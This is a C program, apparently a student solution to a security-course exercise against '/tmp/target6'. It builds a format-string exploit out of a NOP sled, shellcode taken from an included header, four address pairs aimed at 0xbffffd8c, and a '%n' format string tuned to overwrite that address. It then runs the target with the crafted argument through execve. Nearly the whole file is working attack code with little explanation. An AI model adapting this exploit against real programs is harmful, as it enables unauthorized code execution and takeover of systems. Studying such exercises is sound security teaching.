#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"
#define SIZE 256
int main(void)
{
  char *args[3];
  char *env[1];

  char attack[SIZE];
  char * format;
  char * dummyAddr;
  memset(attack, 0x90, SIZE);

  // attack[255] = '\0';

  /*
   * 4 dummy - address pairs.
   * This is used as a writing address for the format string.
   * Address being used: 0xbffffd8c <--- Overwriting this
   * to go to the shell code.
   */ 
  dummyAddr = "\xff\xff\xff\xff\x8c\xfd\xff\xbf"
              "\xff\xff\xff\xff\x8d\xfd\xff\xbf"
              "\xff\xff\xff\xff\x8e\xfd\xff\xbf"
              "\xff\xff\xff\xff\x8f\xfd\xff\xbf";

  /*
   * This is calculated properly using the
   * already written character count.
   *
   * sizeof dummyAddr is 32
   * */
  format = "%08x%08x%08x"
           "%165x%n%241x%n%256x%n%192x%n";
  /*
   * Attack string is as follows
   * __________ DummyAddrPairs__________
   * |                                  |
   * |                                  |
   * |____________Shell code____________|
   * |                                  |
   * |                                  |
   * |__________Format string___________|
   * |...... NOP........ NOP......NOP...|
   */
   
  memcpy(attack, dummyAddr, strlen(dummyAddr));
  memcpy(attack + strlen(dummyAddr), shellcode, strlen(shellcode));
  memcpy(attack + strlen(shellcode) + strlen(dummyAddr) + 4, format, strlen(format));


  args[0] = TARGET;
  args[1] = attack;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
